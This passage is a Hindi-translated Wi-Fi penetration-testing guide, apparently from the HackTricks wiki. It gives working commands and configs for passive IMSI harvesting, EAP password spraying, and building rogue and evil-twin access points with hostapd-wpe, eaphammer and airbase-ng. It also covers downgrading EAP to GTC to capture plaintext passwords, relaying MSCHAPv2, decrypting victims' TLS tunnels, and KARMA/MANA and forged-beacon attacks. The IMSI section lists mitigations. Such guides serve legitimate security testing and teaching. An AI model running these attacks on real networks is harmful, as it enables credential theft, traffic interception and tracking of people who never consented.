EAP-TTLS थोड़ा अलग प्रक्रिया का पालन करता है। EAP-TTLS के साथ, क्लाइंट सामान्यतः TLS tunnel से सुरक्षित होकर PAP या CHAP का उपयोग करके authenticate करता है। इस मामले में, क्लाइंट initial TLS message (tunnel स्थापना के बाद भेजा गया) में User-Name attribute और या तो Password या CHAP-Password attribute शामिल करता है।

किसी भी चुने गए प्रोटोकॉल के लिए, PEAP/TTLS server TLS tunnel स्थापित होने के बाद उपयोगकर्ता की वास्तविक पहचान जान लेता है। वास्तविक पहचान user@realm या केवल user के रूप में हो सकती है। यदि PEAP/TTLS server उपयोगकर्ता को authenticate करने का भी जिम्मा लेता है, तो अब उसके पास उपयोगकर्ता की identity होती है और वह TLS tunnel द्वारा सुरक्षित authentication method के साथ आगे बढ़ता है। वैकल्पिक रूप से, PEAP/TTLS server उपयोगकर्ता के home RADIUS server को एक नया RADIUS request forward कर सकता है। यह नया RADIUS request PEAP या TTLS प्रोटोकॉल लेयर को छोड़ देता है। उन मामलों में जहां protected authentication method EAP है, inner EAP messages home RADIUS server को भेजे जाते हैं बिना EAP-PEAP या EAP-TTLS wrapper के। outgoing RADIUS message का User-Name attribute उपयोगकर्ता की वास्तविक identity रखता है, incoming RADIUS request के anonymous User-Name को बदलते हुए। जब protected authentication method PAP या CHAP होता है (जो केवल TTLS द्वारा समर्थित है), तो TLS payload से निकाले गए User-Name और अन्य authentication attributes outgoing RADIUS message में substitute हो जाते हैं, incoming RADIUS request में पाए गए anonymous User-Name और TTLS EAP-Message attributes को विस्थापित करते हुए।

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>विस्तार के लिए क्लिक करें</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

नोट्स:
- यदि deployment bare EAP‑SIM/AKA का उपयोग करता है और protected identity/pseudonyms नहीं हैं, तो यह किसी भी TLS टनल से पहले काम करता है।
- उजागर मान एक स्थायी पहचानकर्ता है जो subscriber के SIM से जुड़ा होता है; इसे एकत्र करने से लंबी अवधि के ट्रैकिंग और downstream telecom दुरुपयोग संभव हो जाते हैं।

प्रभाव
- प्राइवेसी: सार्वजनिक स्थानों में passive Wi‑Fi कैप्चर से उपयोगकर्ता/डिवाइस का लगातार ट्रैकिंग।
- Telecom abuse bootstrap: IMSI के साथ, SS7/Diameter एक्सेस वाला एक हमलावर लोकेशन क्वेरी कर सकता है या कॉल/SMS interception और MFA चोरी का प्रयास कर सकता है।

रोकथाम / क्या देखना चाहिए
- सत्यापित करें कि क्लाइंट 3GPP मार्गदर्शन (जैसे 3GPP TS 33.402) के अनुसार EAP‑SIM/AKA के लिए anonymous outer identities (pseudonyms) का उपयोग करते हैं।
- पहचान चरण को tunnel करना प्राथमिकता दें (उदा., EAP‑TTLS/PEAP जो inner EAP‑SIM/AKA ले जाता है) ताकि IMSI कभी साफ़ टेक्स्ट में न भेजा जाए।
- association/auth के packet captures में कभी भी EAP-Response/Identity में raw IMSI प्रकट नहीं होना चाहिए।

संबंधित: कैप्चर किए गए मोबाइल पहचानकर्ताओं के साथ Telecom signalling exploitation
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

यदि क्लाइंट से उम्मीद की जाती है कि वह **username and password** का उपयोग करेगा (ध्यान रखें कि इस मामले में **EAP-TLS won't be valid**), तो आप **usernames** की एक **list** (अगले भाग में देखें) और **passwords** प्राप्त करने की कोशिश कर सकते हैं और पहुँच को **bruteforce** करने के लिए [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
आप यह हमला `eaphammer` का उपयोग करके भी कर सकते हैं:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client attacks सिद्धांत

### Network Selection and Roaming

- 802.11 protocol यह परिभाषित करता है कि एक station कैसे एक Extended Service Set (ESS) में जुड़ता है, पर यह ESS या उसके भीतर किसी access point (AP) के चयन के मानदंड निर्दिष्ट नहीं करता।
- Stations उसी ESSID को साझा करने वाले APs के बीच roam कर सकते हैं, बिल्डिंग या क्षेत्र में connectivity बनाए रखते हुए।
- Protocol स्टेशन द्वारा ESS के लिए authentication की मांग करता है पर AP का स्टेशन को authentication करना अनिवार्य नहीं करता।

### Preferred Network Lists (PNLs)

- Stations अपने Preferred Network List (PNL) में हर वायरलेस नेटवर्क का ESSID और नेटवर्क-विशिष्ट configuration विवरण संग्रहित करते हैं।
- PNL का उपयोग ज्ञात नेटवर्कों से स्वचालित रूप से connect होने के लिए किया जाता है, जिससे उपयोगकर्ता का अनुभव बेहतर होता है और connection प्रक्रिया सरल हो जाती है।

### Passive Scanning

- APs समय-समय पर beacon frames broadcast करते हैं, अपनी उपस्थिति और सुविधाओं की घोषणा करते हुए, जिसमें AP का ESSID भी शामिल है जब तक कि broadcasting disabled न हो।
- Passive scanning के दौरान stations beacon frames सुनते हैं। यदि किसी beacon का ESSID स्टेशन के PNL में मौजूद किसी प्रविष्टि से मेल खाता है, तो station स्वचालित रूप से उस AP से connect हो सकता है।
- किसी डिवाइस के PNL का ज्ञान संभावित शोषण के लिए उपयोगी होता है: ज्ञात नेटवर्क के ESSID की नकल करके डिवाइस को धोखा देकर उसे rogue AP से connect करवाया जा सकता है।

### Active Probing

- Active probing में stations probe requests भेजते हैं ताकि नज़दीकी APs और उनकी विशेषताओं का पता लगाया जा सके।
- Directed probe requests किसी विशेष ESSID को लक्षित करते हैं, जिससे यह पता लगाया जा सकता है कि कोई विशेष नेटवर्क रेंज में है या नहीं, भले ही वह hidden network हो।
- Broadcast probe requests में null SSID field होता है और वे सभी नज़दीकी APs को भेजे जाते हैं, जिससे station बिना अपने PNL की सामग्री उजागर किए किसी भी preferred network की जाँच कर सकता है।

## Internet पर redirection के साथ सरल AP

अधिक जटिल हमलों को समझाने से पहले यह बताया जाएगा कि **कैसे** सिर्फ़ एक **AP** **बनाना** और उसके **traffic** को उस interface पर **redirect** करना जो **Internet** से connected है।

Using `ifconfig -a` चेक करें कि AP बनाने के लिए wlan interface और Internet से connected interface मौजूद हैं।

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
कॉन्फ़िग फ़ाइल बनाएँ `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
फिर **set IPs** और **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
और फिर **शुरू करें** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
एक config फ़ाइल `hostapd.conf` बनाएं:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**अवांछित प्रक्रियाओं को बंद करें** , सेट **monitor mode**, और **शुरू करें hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### फॉरवर्डिंग और रीडायरेक्शन
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin attack WiFi क्लाइंट्स के नेटवर्क पहचानने के तरीके का फायदा उठाता है, जो मुख्य रूप से नेटवर्क नाम (ESSID) पर निर्भर करता है और base station (access point) को क्लाइंट के समक्ष authenticate करने की आवश्यकता नहीं होती। मुख्य बिंदु:

- **Difficulty in Differentiation**: जब डिवाइस समान ESSID और encryption type साझा करते हैं, तो उन्हें legitimate और rogue access points के बीच भेद करना मुश्किल होता है। वास्तविक दुनिया के नेटवर्क अक्सर कवरेज बढ़ाने के लिए एक ही ESSID वाले कई access points का उपयोग करते हैं ताकि बिना रुकावट के कनेक्टिविटी बनी रहे।
- **Client Roaming and Connection Manipulation**: 802.11 protocol डिवाइसों को एक ही ESS के भीतर access points के बीच roam करने की अनुमति देता है। Attackers इसका फायदा उठाकर किसी डिवाइस को उसके वर्तमान base station से disconnect करवा कर उसे एक rogue base station से connect करा सकते हैं। यह या तो अधिक मजबूत सिग्नल पेश करके या legitimate access point के कनेक्शन को deauthentication packets या jamming जैसे तरीकों से बाधित करके किया जा सकता है।
- **Challenges in Execution**: कई और अच्छी तरह से स्थित access points वाले वातावरण में सफलतापूर्वक evil twin attack करना चुनौतीपूर्ण हो सकता है। Deauthenticating a single legitimate access point अक्सर डिवाइस को किसी अन्य legitimate access point से connect करा देता है, जब तक कि attacker सभी निकटवर्ती access points को deauthenticate न कर सके या रणनीतिक रूप से rogue access point न रखे।

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
आप **eaphammer** का उपयोग करके एक Evil Twin भी बना सकते हैं (ध्यान दें कि eaphammer के साथ evil twins बनाने के लिए interface **should NOT be** in **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
या Airgeddon का उपयोग करके: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

कृपया ध्यान दें कि डिफ़ॉल्ट रूप से यदि PNL में कोई ESSID WPA protected के रूप में सहेजा गया है, तो डिवाइस स्वतः किसी Open evil Twin से कनेक्ट नहीं होगा। आप वास्तविक AP पर DoS करने की कोशिश कर सकते हैं और उम्मीद कर सकते हैं कि यूज़र मैन्युअली आपके Open evil twin से कनेक्ट कर लेगा, या आप वास्तविक AP पर DoS कर के WPA Evil Twin का उपयोग कर सकते हैं ताकि handshake को capture किया जा सके (इस विधि में आप पीड़ित को आपके साथ कनेक्ट नहीं होने दे पाएँगे क्योंकि आप PSK नहीं जानते, पर आप handshake को capture कर के उसे crack करने की कोशिश कर सकते हैं)।

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

आप एक **Evil Twin using WPA/2** बना सकते हैं और अगर डिवाइस उस SSID को WPA/2 के साथ कनेक्ट करने के लिए कॉन्फ़िगर हैं, तो वे कनेक्ट करने की कोशिश करेंगे। हालांकि, **to complete the 4-way-handshake** के लिए आपको उस **password** को भी जानना होगा जो client उपयोग करने वाला है। यदि आप इसे नहीं जानते, तो **connection won't be completed**।
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

इन हमलों को समझने के लिए, मैं सुझाव दूँगा कि आप पहले संक्षेप में [WPA Enterprise explanation](#wpa-enterprise-mgt) पढ़ें।

**hostapd-wpe का उपयोग**

`hostapd-wpe` को काम करने के लिए एक **कॉन्फ़िगरेशन** फ़ाइल की आवश्यकता होती है। इन कॉन्फ़िगरेशनों के निर्माण को **स्वचालित** करने के लिए आप [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) का उपयोग कर सकते हैं (python फ़ाइल _/etc/hostapd-wpe/_ के अंदर डाउनलोड करें)।
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
कॉन्फ़िगरेशन फ़ाइल में आप ssid, channel, user files, cret/key, dh parameters, wpa version और auth जैसी कई अलग-अलग चीज़ें चुन सकते हैं...

[**hostapd-wpe का उपयोग EAP-TLS के साथ किसी भी certificate को login करने की अनुमति देने के लिए।**](evil-twin-eap-tls.md)

**EAPHammer का उपयोग**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
डिफ़ॉल्ट रूप से, EAPHammer इन authentication methods का उपयोग करता है (ध्यान दें कि GTC पहले है ताकि plaintext passwords प्राप्त करने की कोशिश की जा सके और फिर अधिक robust auth methods का उपयोग किया जाए):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
यह लंबी कनेक्शन समय से बचने के लिए डिफ़ॉल्ट methodology है। हालांकि, आप server को authentication methods को weakest से strongest तक भी निर्दिष्ट कर सकते हैं:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- यदि डिवाइस "do not validate certificate" कॉन्फ़िगर किए गए हैं, तो एक cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) **NetNTLMv2** (PEAP-MSCHAPv2) या **cleartext** क्रेडेंशियल्स (PEAP-GTC) एकत्र करेगा। `bettercap` deauth (`wifi.deauth <BSSID>`) दोनों ही probes के दौरान hidden SSIDs उजागर करता है और reconnects को मजबूर करता है, जब तक कि PMF/802.11w spoofed deauth को ब्लॉक न करे।
- Cracked NetNTLMv2 पुन: उपयोग योग्य Wi‑Fi/AD creds देता है; GTC तुरंत plaintext देता है।

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- अनक्रैक करने योग्य रैंडम पासवर्ड वाले machine accounts के लिए, **MSCHAPv2 relay** का दुरुपयोग करें: `hostapd-mana` को Evil Twin के रूप में चलाएँ, MSCHAPv2 एक्सचेंज को `wpa_sycophant` की ओर फॉरवर्ड करते हुए, जो समान रूप से legitimate AP से कनेक्ट होता है। सफल relay पासवर्ड को रिकवर किए बिना authenticated Wi‑Fi प्रदान कर देता है।
- लक्ष्य सुरक्षा स्तर का समर्थन करने वाले बिल्ड का उपयोग करें (WPA3/PMF को हालिया hostapd/wpa_supplicant की आवश्यकता होती है); PMF deauth coercion को रोकता है, इसलिए voluntary client associations का इंतजार करें।

**Using Airgeddon**

`Airgeddon` पहले से जनरेट किये गए certificated का उपयोग कर सकता है ताकि WPA/WPA2-Enterprise नेटवर्क्स को EAP authentication ऑफर कर सके। फेक नेटवर्क connection protocol को EAP-MD5 पर downgrade कर देगा ताकि यह उपयोगकर्ता और password का MD5 **capture** कर सके। बाद में, attacker पासवर्ड crack करने की कोशिश कर सकता है.\
`Airggedon` आपको एक **continuous Evil Twin attack (noisy)** या **only create the Evil Attack until someone connects (smooth)** करने का option देता है।

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

hostapd-wpe की **configuration** के अंदर उस लाइन पर **comment** करें जिसमें _**dh_file**_ है (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
यह `hostapd-wpe` को DH के बजाय RSA का उपयोग करके keys exchange करने पर मजबूर करेगा, ताकि आप बाद में **servers private key** जानकर ट्रैफिक को **decrypt** कर सकें।

अब modified configuration के साथ सामान्य रूप से **Evil Twin** शुरू करने के लिए **`hostapd-wpe`** चलाएँ। साथ ही, उस interface पर **`wireshark`** चलाएँ जो Evil Twin attack कर रहा है।

अब या बाद में (जब आपने कुछ authentication intents capture कर लिए हों) आप private RSA key को wireshark में जोड़ सकते हैं: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

एक नया एंट्री जोड़ें और फॉर्म को इन मानों से भरें: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Media Access Control Filter Lists (MFACLs) के अलग-अलग प्रकार और उनका rogue Access Point (AP) के व्यवहार पर प्रभाव:

1. **MAC-based Whitelist**:
- rogue AP केवल उन devices के probe requests का जवाब देगा जो whitelist में निर्दिष्ट हैं, अन्य सभी के लिए यह अनदेखा रहेगा।
2. **MAC-based Blacklist**:
- rogue AP उन devices के probe requests को ignore करेगा जो blacklist में हैं, जिससे rogue AP उन विशिष्ट devices के लिए invisible बन जाएगा।
3. **SSID-based Whitelist**:
- rogue AP केवल उन specific ESSIDs के लिए probe requests का जवाब देगा जो सूचीबद्ध हैं, जिससे यह उन devices के लिए invisible रहेगा जिनके Preferred Network Lists (PNLs) में वे ESSIDs नहीं हैं।
4. **SSID-based Blacklist**:
- rogue AP उन specific ESSIDs के लिए probe requests का जवाब नहीं देगा जो blacklist में हैं, जिससे यह उन devices के लिए invisible बन जाएगा जो उन particular networks की खोज कर रहे हैं।
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

यह तरीका **हमलावर को एक दुष्ट access point (AP) बनाने की अनुमति देता है जो नेटवर्क से जुड़ने की कोशिश करने वाले डिवाइसों की सभी probe requests का उत्तर देता है**। यह तकनीक उन नेटवर्कों की नकल करके जिनकी खोज डिवाइस कर रहे होते हैं, डिवाइसों को **हमलावर के AP से जुड़ने के लिए धोखा देती है**। जब कोई डिवाइस इस rogue AP को connection request भेजता है, तो कनेक्शन पूरा हो जाता है और डिवाइस गलती से हमलावर के नेटवर्क से जुड़ जाता है।

### MANA

फिर, **डिवाइस अस्थिर नेटवर्क प्रतिक्रियाओं को अनदेखा करने लगे**, जिससे मूल karma attack की प्रभावशीलता घट गई। हालाँकि, Ian de Villiers और Dominic White ने एक नई विधि पेश की, जिसे **MANA attack** के रूप में जाना जाता है। यह विधि rogue AP को **Preferred Network Lists (PNL) को devices से उनके broadcast probe requests का उत्तर देकर कैप्चर करने** में शामिल करती है, उन network names (SSIDs) के साथ जिन्हें डिवाइसों ने पहले से सेव किया होता है। यह परिष्कृत हमला मूल karma attack के खिलाफ मौजूद सुरक्षा उपायों को बाईपास कर देता है, क्योंकि यह उस तरीके का फायदा उठाता है जिससे डिवाइस ज्ञात नेटवर्कों को याद रखते और उन्हें प्राथमिकता देते हैं।

The MANA attack devices से आने वाली दोनों directed और broadcast probe requests की निगरानी करके काम करता है। directed requests के लिए, यह डिवाइस का MAC address और अनुरोधित network name रिकॉर्ड करता है और इस जानकारी को एक सूची में जोड़ता है। जब कोई broadcast request प्राप्त होती है, तो AP डिवाइस की सूची में किसी भी नेटवर्क से मेल खाने वाली जानकारी के साथ उत्तर देता है, जिससे डिवाइस को rogue AP से जुड़ने के लिए प्रोत्साहित किया जाता है।
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** एक उन्नत रणनीति है जब डिवाइस directed probing का उपयोग नहीं करते हैं या जब उनके Preferred Network Lists (PNL) हमलावर के लिए अज्ञात होते हैं। यह इस सिद्धांत पर काम करता है कि **एक ही क्षेत्र में मौजूद डिवाइसों के PNLs में कुछ नेटवर्क नाम साझा होने की संभावना रहती है**। चुनिंदा जवाब देने के बजाय, यह attack सभी observed devices के combined PNLs में पाए जाने वाले प्रत्येक नेटवर्क नाम (ESSID) के लिए probe responses प्रसारित करता है। यह व्यापक तरीका किसी डिवाइस के परिचित नेटवर्क को पहचानकर rogue Access Point (AP) से कनेक्ट करने का प्रयास करने की संभावना बढ़ा देता है।
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

जब **Loud MANA attack** पर्याप्त न हो, तो **Known Beacon attack** एक वैकल्पिक तरीका प्रस्तुत करता है। यह विधि कनेक्शन प्रक्रिया को brute-force करती है, एक ऐसे AP का अनुकरण करके जो किसी भी नेटवर्क नाम पर प्रतिक्रिया देता है, और एक wordlist से व्युत्पन्न संभावित ESSIDs की सूची के माध्यम से चक्र चलाती है। यह कई नेटवर्क की उपस्थिति का अनुकरण करता है, आशा करते हुए कि किसी ESSID का मेल पीड़ित के PNL में मिलेगा, जिससे नकली AP से कनेक्शन प्रयास प्रेरित होगा। डिवाइसों को फँसाने के लिए अधिक आक्रामक प्रयास हेतु इसे `--loud` विकल्प के साथ मिलाकर हमले को तेज किया जा सकता है।

Eaphammer ने इस हमले को MANA attack के रूप में लागू किया है जहाँ सूची में मौजूद सभी ESSIDs प्रस्तुत किए जाते हैं (आप इसे `--loud` के साथ जोड़कर Loud MANA + Known beacons attack भी बना सकते हैं):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

यह **Known Beacon Burst attack** उस तकनीक को दर्शाता है जिसमें **rapid-fire broadcasting of beacon frames for each ESSID listed in a file** शामिल होता है। यह नकली नेटवर्क्स का एक घना वातावरण बना देता है, जिससे डिवाइसों के rogue AP से जुड़ने की संभावना काफी बढ़ जाती है, खासकर जब इसे MANA attack के साथ संयोजित किया जाए। यह तकनीक गति और मात्रा का उपयोग करके डिवाइसों के नेटवर्क चयन तंत्र को अभिभूत कर देती है।
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** एक प्रोटोकॉल है जो उपकरणों को पारंपरिक वायरलेस एक्सेस पॉइंट की आवश्यकता के बिना Wi‑Fi का उपयोग करके सीधे एक-दूसरे से जुड़ने में सक्षम बनाता है। यह क्षमता विभिन्न Internet of Things (IoT) डिवाइसों में एकीकृत होती है, जैसे printers और televisions, और डिवाइस-टू-डिवाइस सीधे संचार की सुविधा देती है। Wi‑Fi Direct की एक प्रमुख विशेषता यह है कि कनेक्शन को व्यवस्थापित करने के लिए एक डिवाइस access point की भूमिका निभाता है, जिसे group owner कहा जाता है।

Wi‑Fi Direct कनेक्शनों की सुरक्षा **Wi-Fi Protected Setup (WPS)** के माध्यम से स्थापित होती है, जो secure pairing के लिए कई तरीकों का समर्थन करता है, जिनमें शामिल हैं:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

ये तरीके, विशेषकर PIN entry, पारंपरिक Wi‑Fi नेटवर्क में WPS जैसी vulnerabilities के प्रति संवेदनशील होते हैं, और इन्हें समान attack vectors का लक्ष्य बनाया जा सकता है।

### EvilDirect Hijacking

**EvilDirect Hijacking** Wi‑Fi Direct के लिए विशिष्ट एक attack है। यह एक Evil Twin attack की अवधारणा का प्रतीक है लेकिन Wi‑Fi Direct कनेक्शनों को लक्षित करता है। इस परिदृश्य में attacker वैध group owner का impersonate करता है ताकि devices को एक malicious entity से जुड़ने के लिए धोखा दिया जा सके। इस विधि को `airbase-ng` जैसे tools का उपयोग करके निष्पादित किया जा सकता है, और impersonated device के channel, ESSID, और MAC address को निर्दिष्ट किया जाता है:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: देखें [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitacionde WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
